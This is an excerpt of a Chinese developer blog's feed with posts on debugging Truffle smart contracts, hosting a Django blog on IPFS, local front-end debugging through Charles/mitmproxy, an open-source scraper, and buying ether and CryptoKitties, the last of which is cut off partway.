class="line"></span><br><span class="line">1. 复制交易 id 到 debug 命令下</span><br></pre></td></tr></table></figure>debug 0xe493340792ab92b95ac40e43dca6bc88fba7fd67191989d59ca30f79320e883f<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">回到调试器</span><br></pre></td></tr></table></figure></code></pre><p>Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:</p><p>   1: pragma solidity ^0.4.17;<br>   2:<br>   3: contract SimpleStorage {<br>      ^^^^^^^^^^^^^^^^^^^^^^^</p><p>   debug(develop:0xe4933407…)&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. 键入 `Enter`</span><br></pre></td></tr></table></figure></p><pre><code>    Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:5:6:   function set(uint x) public {7:     assert(x == 0);       ^^^^^^^^^^^^^^debug(develop:0x7e060037...)&gt;Transaction halted with a RUNTIME ERROR.This is likely due to an intentional halting expression, like assert(), require() or revert(). It can also be due to out-of-gasexceptions. Please inspect your transaction parameters and contract code to determine the meaning of this error.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">我们可以看到最后的事件中触发了错误.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### 错误 #3: 无错误，但是函数没有按预期执行</span><br><span class="line"></span><br><span class="line">有时候，错误不一定是真正的错误，它在运行时间内不会引起问题，只是不会按预期执行。</span><br><span class="line"></span><br><span class="line">举个例子，一个事件将会在变量是奇数的时候执行，而另一个事件在偶数的时候执行。如果我们调换了这个条件，让相反的事件执行了。它斌不会触发错误，然而，合约会不按照我们的预期执行下去。</span><br><span class="line"></span><br><span class="line">我们再次用调试器来找出错误。</span><br><span class="line"></span><br><span class="line">**引入错误**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1. 再次打开 `Store.sol`</span><br><span class="line">2. 替换 `set()` 函数</span><br></pre></td></tr></table></figure>event Odd();event Even();function set(uint x) public {  myVariable = x;  if (x % 2 == 0) {    Odd();  } else {    Even();  }}<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    代码有两个假的事件，`Odd()` 和 `Even()` 是否执行取决于 x 是否能被 2 整除。</span><br><span class="line">    </span><br><span class="line">    但是我们发现 x 能被 2 整除时， `Odd()` 事件触发了。</span><br><span class="line"></span><br><span class="line">**测试合约**</span><br><span class="line"></span><br><span class="line">1. `migrate --reset`</span><br><span class="line">2. `SimpleStorage.deployed().then(function(instance)&#123;return instance.set(4);&#125;);`</span><br><span class="line"></span><br><span class="line">没有错误产生，输出如下</span><br></pre></td></tr></table></figure></code></pre><p>{ tx: ‘0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42’,<br>  receipt:<br>   { transactionHash: ‘0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42’,<br>     transactionIndex: 0,<br>     blockHash: ‘0x08d7c35904e4a93298ed5be862227fcf18383fec374759202cf9e513b390956f’,<br>     blockNumber: 5,<br>     gasUsed: 42404,<br>     cumulativeGasUsed: 42404,<br>     contractAddress: null,<br>     logs: [ [Object] ] },<br>  logs:<br>   [ { logIndex: 0,<br>       transactionIndex: 0,<br>       transactionHash: ‘0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42’,<br>       blockHash: ‘0x08d7c35904e4a93298ed5be862227fcf18383fec374759202cf9e513b390956f’,<br>       blockNumber: 5,<br>       address: ‘0x377bbcae5327695b32a1784e0e13bedc8e078c9c’,<br>       type: ‘mined’,<br>       event: ‘Odd’,<br>       args: {} } ] }<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">logs 里面显示调用了 Odd 事件，这是不对的，我们的任务是找到这个事件为什么会被触发。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> **调试错误**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1. 复制交易 id 到 debug 命令下</span><br></pre></td></tr></table></figure></p><p>debug 0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. 键入 Enter 几次，最后我们将看到调用 Odd 事件的条件</span><br></pre></td></tr></table></figure></p><p>Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:</p><p>10:   function set(uint x) public {<br>11:     myVariable = x;<br>12:     if (x % 2 == 0) {<br>        ^^^^^^^^^^^^^^^^</p><p>debug(develop:0x7f799ad5…)&gt;</p><p>Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:</p><p>11:     myVariable = x;<br>12:     if (x % 2 == 0) {<br>13:       Odd();<br>          ^^^^^</p><p>debug(develop:0x7f799ad5…)&gt;<br>```</p><p>错误找到了，这个条件导致了错误的事件调用。</p><h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>有了在 Truffle 中的调试能力，你可以编写更健壮的智能合约。</p><p>翻译自： <a href="http://truffleframework.com/tutorials/debugging-a-smart-contract" target="_blank" rel="noopener">http://truffleframework.com/tutorials/debugging-a-smart-contract</a></p><p>更多内容请访问：<a href="https://www.bdaily.club/" target="_blank" rel="noopener">区块链日报 - 关注区块链 - 推送高质量区块链文章</a></p><p>订阅区块链日报</p><p>微博： <a href="https://weibo.com/u/6453120687" target="_blank" rel="noopener">@区块链_daily</a><br>RSS: <a href="https://www.bdaily.club/rss" target="_blank" rel="noopener">rss</a><br>Twitter: <a href="https://twitter.com/bchain_daily" target="_blank" rel="noopener">@区块链日报</a><br>知乎： <a href="https://zhuanlan.zhihu.com/btchain" target="_blank" rel="noopener">区块链日报</a><br>Medium: <a href="https://medium.com/@blockchaindaily" target="_blank" rel="noopener">区块链日报</a><br>微信公众号: 搜索 【区块链daily】或 <a href="http://78rc6b.com1.z0.glb.clouddn.com/qrcode_for_gh_f652585159d6_258.jpg" target="_blank" rel="noopener">点击扫二维码关注</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;注意：本教程的 Truffle 版本 4.4.0 及以上&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;不像你在其他地方看到的纸质合约，以太坊的智能合约是代码组成的，需要你以非常谨慎的态度去对待它。&lt;/p&gt;
&lt;p&gt;（这是一件好事，想象下如果现实世界的合同需要编译的话会更清晰么？）&lt;/p&gt;
&lt;p&gt;如果我们的合同没有被正确的编码出来, 我们的交易可能会失败，导致以太币的损失(以 gas 的形式)，更不用说浪费时间和精力。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;幸运的是，Truffle (版本 4 以上) 内置了逐步调试的功能&lt;/strong&gt;，所以一旦发生错误，你可以很快发现并修复它。&lt;/p&gt;
&lt;p&gt;在本教程中,我们将在测试的区块链环境中部署一个基础的合同，并引入一些错误，通过 Truffle 内置调试器修复它们。&lt;br&gt;
    
    </summary>
    
    
      <category term="智能合约" scheme="https://facert.github.io/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>利用 ipfs 构建去中心化 django 博客系统</title>
    <link href="https://facert.github.io/2018/02/25/%E5%88%A9%E7%94%A8-ipfs-%E6%9E%84%E5%BB%BA%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96-django-%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/"/>
    <id>https://facert.github.io/2018/02/25/利用-ipfs-构建去中心化-django-博客系统/</id>
    <published>2018-02-25T04:10:54.000Z</published>
    <updated>2018-04-06T09:11:31.000Z</updated>
    
    <content type="html"><![CDATA[<h5 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h5><p>运营 <a href="https://www.btchain.me/" target="_blank" rel="noopener">区块链日报</a> 有一段时间了，访问量也在不断上涨，不过由于搭建在国外 vps 上，所以经常有同学反映网站打不开。这段时间尝试了一些方案，发现 ipfs 的去中心化方案能够完美这个问题。</p><p>关注区块链的同学也许已经对 <a href="https://ipfs.io/" target="_blank" rel="noopener">ipfs</a> 有过一定了解，我也在日报中推送过好几篇相关的文章，感兴趣的同学可以关注下。这里我简单介绍下，ipfs 是一个点对点的分布式文件系统，只要文件被添加到 ipfs 节点上，他就有个 hash 值来代表他的存在，哪怕只在文件中修改一个比特的数据，哈希都会完全不同。当下一步向 ipfs 分布式网络查找该哈希的时候，它通过使用一个分布式哈希表，可以快速地找到拥有数据的节点，从而检索该数据，并使用哈希验证这是否是正确的数据。而存储这些文件的节点我们可以认为也是一种矿工的形式，只是不像比特币利用算力来做工作量证明，而是存储和带宽。目前 ipfs 团队正在推进发布基于 POR (带激励机制的带宽，存储容量等资源相关的一种共识)的 filecoin。<br><a id="more"></a></p><h5 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h5><p>好了，介绍完 ipfs，我们来看下 ipfs 如何和 django 结合起来搭建自己的去中心化 cdn。</p><p>由于 django 搭建的网站的网页是动态服务器渲染的，而 ipfs 只能存储静态文件，所以需要先将 django 的网页静态化，然后再上传到 ipfs。</p><p>举 <a href="https://www.btchain.me/" target="_blank" rel="noopener">区块链日报</a> 为例，有两种方案可以实现</p><ol><li>每次在 admin 后台创建日报保存的时候，生成静态网页文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def generate_static_html(issue):</span><br><span class="line">    articles = Article.objects.filter(issue=issue, status=2).order_by(&quot;-created&quot;)</span><br><span class="line">    context = &#123;&apos;articles&apos;: articles, &quot;issue&quot;: issue&#125;</span><br><span class="line">    static_html = os.path.join(settings.IPFS_ROOT, &quot;%s.html&quot; % issue.id)</span><br><span class="line">    content = render_to_string(&apos;articles_ipfs.html&apos;, context)</span><br><span class="line">    with open(static_html, &apos;w&apos;) as static_file:</span><br><span class="line">        static_file.write(content.encode(&quot;utf-8&quot;))</span><br><span class="line">        </span><br><span class="line">class IssueAdmin(admin.ModelAdmin):</span><br><span class="line"></span><br><span class="line">    def save_model(self, request, obj, form, change):</span><br><span class="line">        obj.save()</span><br><span class="line">        if obj.status == Issue.PUBLISHED:</span><br><span class="line">            generate_static_html(obj)</span><br></pre></td></tr></table></figure><ol><li>定期生成全站的静态文件，然后同步到 ipfs</li></ol><h5 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h5><p>接下来我们利用 ipfs 上传上文生成的静态文件。</p><ol><li><p>安装 ipfs 可直接参考官方教程，<a href="https://ipfs.io/docs/install/" target="_blank" rel="noopener">https://ipfs.io/docs/install/</a>, 这里假设安装的是 <code>go-ipfs</code> </p></li><li><p>然后执行 <code>ipfs init</code>，会在本地建立一个 ipfs 节点。</p></li><li><p>查看节点 id <code>ipfs id</code></p></li></ol><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    &#123;</span><br><span class="line">&quot;ID&quot;: &quot;QmYpbbyrVQspuNNqowRip3ShmYFcXvnUkAvB23GVyjfenV&quot;,</span><br><span class="line">&quot;PublicKey&quot;: &quot;CAASpgIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDFsZQi+VdfZIHTcNwsAMfjaAo9fe7GtiusbF4ZWqGxo3v05sHXrHbM1fb+FRnCmzZ7tZ679EfgxCzN38q1bAvOQVtdD/TzDQQKrLJEOyorhnML8cOtMWua/Rkvfs56Ut6fPgVHvCFpuhrUZE8eBTwKInf5kJaEOZfT/u9pi3BO5HJMUO1oHE6R66IKO3QQda3QXahx4dndc3Sx7HX+MeBd6kUPTpOtqmeFIRJE0rDSXnIxiUGlqkMbfIAgBo4XKBuajm+UMLTCT5Wo/0cNu+j8mLuNLqwcOWNR7KKKCZzUFrm+TCxMjAusy2ujgunH19vIMluGlOgiXvydwrbmZiU1AgMBAAE=&quot;,</span><br><span class="line">&quot;Addresses&quot;: null,</span><br><span class="line">&quot;AgentVersion&quot;: &quot;go-ipfs/0.4.13/&quot;,</span><br><span class="line">&quot;ProtocolVersion&quot;: &quot;ipfs/0.1.0&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre><ol><li><p>启动节点服务器 <code>ipfs daemon</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Initializing daemon...</span><br><span class="line">Swarm listening on /ip4/127.0.0.1/tcp/4001</span><br><span class="line">Swarm listening on /ip4/172.22.0.29/tcp/4001</span><br><span class="line">Swarm listening on /ip4/192.168.99.172/tcp/4001</span><br><span class="line">Swarm listening on /ip6/::1/tcp/4001</span><br><span class="line">Swarm listening on /p2p-circuit/ipfs/QmYpbbyrVQspuNNqowRip3ShmYFcXvnUkAvB23GVyjfenV</span><br><span class="line">Swarm announcing /ip4/127.0.0.1/tcp/4001</span><br><span class="line">Swarm announcing /ip4/172.22.0.29/tcp/4001</span><br><span class="line">Swarm announcing /ip4/192.168.1.2/tcp/36734</span><br><span class="line">Swarm announcing /ip4/192.168.99.172/tcp/4001</span><br><span class="line">Swarm announcing /ip6/::1/tcp/4001</span><br><span class="line">API server listening on /ip4/127.0.0.1/tcp/5001</span><br><span class="line">Gateway (readonly) server listening on /ip4/127.0.0.1/tcp/8080</span><br><span class="line">Daemon is ready</span><br></pre></td></tr></table></figure></li><li><p>这个时候访问 <a href="http://localhost:5001/webui" target="_blank" rel="noopener">http://localhost:5001/webui</a> ，就可以看到本地节点的一些信息，包括文件 hash ，正在连接的节点，配置项。你也可以直接在这里选择上传文件。</p></li><li><p>我们可以通过命令直接上传整个静态文件目录 <code>ipfs add -r ipfs</code>， ipfs 为上文生成的静态文件目录。</p></li></ol><p><img src="/media/15195409091484.jpg" alt=""></p><ol><li>可以看到根路径的 hash 为 <code>QmQ19m1wLVpvi4142Mr3HHJJBx5QmuS95ibLt8ivZyG9GE</code> ，直接访问 <a href="https://ipfs.io/ipfs/QmQ19m1wLVpvi4142Mr3HHJJBx5QmuS95ibLt8ivZyG9GE/index_ipfs.html" target="_blank" rel="noopener">https://ipfs.io/ipfs/QmQ19m1wLVpvi4142Mr3HHJJBx5QmuS95ibLt8ivZyG9GE/index_ipfs.html</a> </li></ol><p><img src="/media/15195614553288.jpg" alt=""></p><ol><li><p>目前网址已经能够访问，不过会存在一个问题， hash 值会随着文件的变化而变化，也就是一旦网站有更新，上文的地址就变了，所以我们可以将网站发布到 IPNS，将节点的 id （不会随文件变化而变化）绑定到项目根目录 hash, 这样更新博客的时候，重新发布到 IPNS 即可。</p></li><li><p>很简单的命令，执行 <code>ipfs name publish &lt;根目录 hash&gt;</code> 便可，发布完成后，可以执行 <code>ipfs name resolve &lt;节点 id&gt;</code>，查看是否绑定。</p></li></ol><p><img src="/media/15195621769351.jpg" alt=""></p><ol><li>最后访问 <a href="https://ipfs.io/ipns/QmYpbbyrVQspuNNqowRip3ShmYFcXvnUkAvB23GVyjfenV/index_ipfs.html" target="_blank" rel="noopener">https://ipfs.io/ipns/QmYpbbyrVQspuNNqowRip3ShmYFcXvnUkAvB23GVyjfenV/index_ipfs.html</a> ，同样也能得到想要的页面。</li></ol><h5 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h5><p>最后简单介绍下区块链日报吧，区块链日报是一个博客，灵感来自于湾区日报。主要记录博主在学习区块链当中读过的高质量区块链文章，通过一些渠道(<a href="https://weibo.com/u/6453120687" target="_blank" rel="noopener">微博</a>，<a href="https://zhuanlan.zhihu.com/btchain" target="_blank" rel="noopener">知乎</a>，<a href="https://twitter.com/bchain_daily" target="_blank" rel="noopener">Twitter</a>，<a href="https://www.btchain.me/rss" target="_blank" rel="noopener">RSS</a>, <a href="https://medium.com/@blockchaindaily" target="_blank" rel="noopener">Medium</a>)定时发布推送。</p><p>网站采用 django 搭建，nginx 做负载均衡，supervisord 管理进程，Task Queue 是 Redis。Scheduler 用的是 Celery Beat，Async Worker 是 Celery。</p>]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h5&gt;&lt;p&gt;运营 &lt;a href=&quot;https://www.btchain.me/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;区块链日报&lt;/a&gt; 有一段时间了，访问量也在不断上涨，不过由于搭建在国外 vps 上，所以经常有同学反映网站打不开。这段时间尝试了一些方案，发现 ipfs 的去中心化方案能够完美这个问题。&lt;/p&gt;
&lt;p&gt;关注区块链的同学也许已经对 &lt;a href=&quot;https://ipfs.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ipfs&lt;/a&gt; 有过一定了解，我也在日报中推送过好几篇相关的文章，感兴趣的同学可以关注下。这里我简单介绍下，ipfs 是一个点对点的分布式文件系统，只要文件被添加到 ipfs 节点上，他就有个 hash 值来代表他的存在，哪怕只在文件中修改一个比特的数据，哈希都会完全不同。当下一步向 ipfs 分布式网络查找该哈希的时候，它通过使用一个分布式哈希表，可以快速地找到拥有数据的节点，从而检索该数据，并使用哈希验证这是否是正确的数据。而存储这些文件的节点我们可以认为也是一种矿工的形式，只是不像比特币利用算力来做工作量证明，而是存储和带宽。目前 ipfs 团队正在推进发布基于 POR (带激励机制的带宽，存储容量等资源相关的一种共识)的 filecoin。&lt;br&gt;
    
    </summary>
    
    
      <category term="ipfs" scheme="https://facert.github.io/tags/ipfs/"/>
    
  </entry>
  
  <entry>
    <title>前端线上调试指南</title>
    <link href="https://facert.github.io/2018/01/27/%E5%89%8D%E7%AB%AF%E7%BA%BF%E4%B8%8A%E8%B0%83%E8%AF%95%E6%8C%87%E5%8D%97/"/>
    <id>https://facert.github.io/2018/01/27/前端线上调试指南/</id>
    <published>2018-01-27T09:46:08.000Z</published>
    <updated>2018-01-28T04:45:26.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p>前端工程师可能会遇到如下的场景：测试环境功能都 ok ，到了生产环境就出问题，改完 bug 上线后发现又引入了新的问题。只能再次重复这个过程。</p><p>所以能不能不上线，将本地代码直接作用于线上，来调试功能呢。</p><p>我们有如下工具可以选择 fiddler (windows), charles (mac), mitmproxy (可自定义脚本)</p><p>下面我们举 charles 和 mitmproxy 为例子说明<br><a id="more"></a></p><h5 id="charles"><a href="#charles" class="headerlink" title="charles"></a>charles</h5><ol><li><p>打开 charles, 点击 Tools -&gt; Map Local -&gt; Add， 将需要的 Path 映射到 Local path （自己的本地目录），然后找到自己需要映射的目录或文件，（比如 js 目录）。</p><p><img src="/media/15170629957005.jpg" alt=""></p></li></ol><ol><li>这里面我们也可以选择 Map Remote 模式，它能映射到 url 地址，如 www.example.com/js -&gt; test.example.com/js</li></ol><ol><li>接下来我们只需让浏览器代理到 charles 即可，charles 默认开启的是 http 代理，8888 端口</li></ol><ul><li>Chrome 用户下载插件 switchyOmega，配置如下</li></ul><p><img src="/media/15170631701355.jpg" alt=""></p><ul><li>Safari 用户不用装插件，只需 charles -&gt; Proxy -&gt; MacosProxy 选中即可。</li></ul><ol><li>配置完成！接下来你本地对 js 的改动，直接能够作用在 exampel.com 上。</li></ol><h5 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a>mitmproxy</h5><p>mitmproxy 没有界面，只能在终端运行，不过它可以定制 python 插件，实现想要的功能。</p><p>接下来我先介绍下原理，为什么本地的文件能直接作用于线上。</p><p>原理在于我们使用了代理，或者更准确一点叫中间人劫持，不过这个中间人是我们自己。</p><p>代理软件在代理我们访问的网页时，会根据我们配置的规则修改返回给我们的内容，比如我们访问 example.com/js/a.js 的时候，发现我们配置了规则是去本地找 a.js 这个文件，找到这个文件，拿到内容后，会直接将 response 的 boby 内容改成本地的内容，这样浏览器就会根据本地内容做渲染。</p><p>我们用 mitmproxy 的脚本来实现，自定义一个文件 test.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import glob</span><br><span class="line">from mitmproxy import http</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 拿到本地 a.js 的内容</span><br><span class="line">main_js = glob.glob(&apos;./js/a\.js&apos;)</span><br><span class="line">main_content = &apos;&apos;</span><br><span class="line">if main_js:</span><br><span class="line">    with open(main_js[0]) as f:</span><br><span class="line">        main_content = f.read()</span><br><span class="line"></span><br><span class="line"># 匹配 example.com/js/a.js 的内容</span><br><span class="line">pattern = re.compile(&quot;http://example\.com/js/a\.js&quot;)</span><br><span class="line"></span><br><span class="line">def request(flow: http.HTTPFlow) -&gt; None:</span><br><span class="line">    if pattern.match(flow.request.pretty_url):</span><br><span class="line">        flow.response = http.HTTPResponse.make(</span><br><span class="line">            200,</span><br><span class="line">            main_content,</span><br><span class="line">            &#123;&quot;Content-Type&quot;: &quot;application/javascript&quot;,</span><br><span class="line">             &quot;Content-Encoding&quot;: &quot;gzip&quot;&#125;</span><br><span class="line">        )</span><br></pre></td></tr></table></figure><p>然后运行 <code>mitmdump  -s test.py</code> 就可达到和 charles 一样的效果。</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;场景&quot;&gt;&lt;a href=&quot;#场景&quot; class=&quot;headerlink&quot; title=&quot;场景&quot;&gt;&lt;/a&gt;场景&lt;/h4&gt;&lt;p&gt;前端工程师可能会遇到如下的场景：测试环境功能都 ok ，到了生产环境就出问题，改完 bug 上线后发现又引入了新的问题。只能再次重复这个过程。&lt;/p&gt;
&lt;p&gt;所以能不能不上线，将本地代码直接作用于线上，来调试功能呢。&lt;/p&gt;
&lt;p&gt;我们有如下工具可以选择 fiddler (windows), charles (mac), mitmproxy (可自定义脚本)&lt;/p&gt;
&lt;p&gt;下面我们举 charles 和 mitmproxy 为例子说明&lt;br&gt;
    
    </summary>
    
    
      <category term="前端" scheme="https://facert.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>开源【动态可配化爬虫】代码</title>
    <link href="https://facert.github.io/2018/01/13/%E5%BC%80%E6%BA%90%E3%80%90%E5%8A%A8%E6%80%81%E5%8F%AF%E9%85%8D%E5%8C%96%E7%88%AC%E8%99%AB%E3%80%91%E4%BB%A3%E7%A0%81/"/>
    <id>https://facert.github.io/2018/01/13/开源【动态可配化爬虫】代码/</id>
    <published>2018-01-13T06:17:37.000Z</published>
    <updated>2018-01-27T14:46:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>继上篇文章 <a href="https://zhuanlan.zhihu.com/p/31659456" target="_blank" rel="noopener">动态可配置化 Python 爬虫</a> 说过的 Todo 项一直没有精力去维护，索性开源代码，让各位自己去折腾完善，欢迎提 pr。</p><p>项目地址：<a href="https://github.com/facert/scrapy_helper" target="_blank" rel="noopener">https://github.com/facert/scrapy_helper</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;继上篇文章 &lt;a href=&quot;https://zhuanlan.zhihu.com/p/31659456&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;动态可配置化 Python 爬虫&lt;/a&gt; 说过的 Todo 项一直没有精力去维护，索性开源代码，让各位自
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>以太坊云撸猫教程</title>
    <link href="https://facert.github.io/2017/12/10/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%BA%91%E6%92%B8%E7%8C%AB%E6%95%99%E7%A8%8B/"/>
    <id>https://facert.github.io/2017/12/10/以太坊云撸猫教程/</id>
    <published>2017-12-10T04:12:11.000Z</published>
    <updated>2018-04-06T09:11:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近听说以太坊上能撸猫了，而且据说还能养猫赚钱，有些猫的价格已经高的离谱，按今天一个以太币 = 2800 ¥ 的节奏，1000 个 就是 280 w。</p><p><img src="/media/15128794800292.jpg" alt=""></p><p>那么作为国内的普通用户想尝试下养一只猫该怎么办呢，因为可能大家没有任何虚拟币，而且很多国内的渠道都已经封闭，但是买猫的话只能通过以太币购买。</p><p>下面介绍一下我使用的方法<br><a id="more"></a></p><h4 id="0x01-买入以太币"><a href="#0x01-买入以太币" class="headerlink" title="0x01 买入以太币"></a>0x01 买入以太币</h4><p>首先声明我和任何比特币交易所没有关系，下文提到的火币只是因为之前用过，所以比较熟悉操作流程。另外我的方法肯定不是最省钱（由于手续费的存在）的方式，这里只是给没有玩过币又想买猫的人的提供一个思路。</p><ol><li><p>由于现在买币的各种限制，国内只能通过 c2c 交易买到相应的币，c2c 是指由平台担保，个人之间交易虚拟币的模式。所以我们需要先注册 <a href="https://www.huobi.com/" target="_blank" rel="noopener">https://www.huobi.com/</a> 火币网的的账户，点击购买比特币（由于目前火币 c2c 只开通了 btc 和 usdt 的交易，没有 eth 的交易），这里需要先通过实名认证才能买入 btc。</p></li><li><p>接下来就是选择商家，选择买入的量，点击确认买入，就生成了一个订单。</p><p> <img src="/media/15128807798929.jpg" alt=""></p></li></ol><ol><li><p>然后按照他们指定的方法（支付宝，微信，银行卡转账）打完钱后，并沟通完成后，一般几分钟内就可以看到自己的账户已经入账比特币。<br><img src="/media/15128809494939.jpg" alt="">  </p></li><li><p>接下来点击资金管理，选择与火币 Pro 互转，将买入的比特币转入 Pro 账户，这样才能通过交易所将 比特币换成 以太币。</p></li><li><p>转入后我们进入 <a href="https://www.huobi.pro/zh-cn/btc_usdt/exchange/" target="_blank" rel="noopener">https://www.huobi.pro/zh-cn/btc_usdt/exchange/</a> 交易。这里面一定要看清楚买入的是 eth</p><p> <img src="/media/15128813947643.jpg" alt=""></p></li><li><p>买入成交后就可以看到自己 Pro 账户的资产有 eth 的份额了。 <a href="https://www.huobi.pro/zh-cn/finance/" target="_blank" rel="noopener">https://www.huobi.pro/zh-cn/finance/</a></p></li></ol><h4 id="0x02-以太币钱包"><a href="#0x02-以太币钱包" class="headerlink" title="0x02 以太币钱包"></a>0x02 以太币钱包</h4><p>接下来我们要做的是将交易所的 eth 提取到自己的钱包中。</p><ol><li><p>首先我们需要有自己的以太坊钱包，这里面介绍一种 chrome 插件的钱包 MetaMask。首先去 chrome 的应用商店下载 MetaMask </p><p> <img src="/media/15128863554431.jpg" alt=""></p></li></ol><pre><code>![](/media/15128818707667.jpg)</code></pre><ol><li><p>下载注册完成后，就有自己以太币的钱包了，这里一定要保存好自己的私钥，就是那一串随机的字母。接下里我们拷贝钱包的地址，这个可以看成是自己对外交易的唯一账户名</p><p> <img src="/media/15128820941231.jpg" alt=""></p></li></ol><ol><li><p>钱包账户准备好后，我们进入火币网的提币地址管理界面，<a href="https://www.huobi.pro/zh-cn/withdraw_address/" target="_blank" rel="noopener">https://www.huobi.pro/zh-cn/withdraw_address/</a> ，设置提币地址</p><p> <img src="/media/15128865672492.jpg" alt=""></p></li><li><p>设置完成后，去资产页面提币即可</p><p> <img src="/media/15128866511594.jpg" alt=""></p></li><li><p>具体到账速度看当时以太网的网络状况，由于目前撸猫的人太多，导致以太网交易有些拥堵。交易被确认后可以在 MetaMask 看到自己的以太币余额。</p></li></ol><h4 id="0x03-买猫"><a href="#0x03-买猫" class="headerlink" title="0x03 买猫"></a>0x03 买猫</h4><ol><li>接下来可以在 <a href="https://www.cryptokitties.co/marketplace" target="_blank" rel="noopener">https://www.cryptokitties.co/marketplace</a> 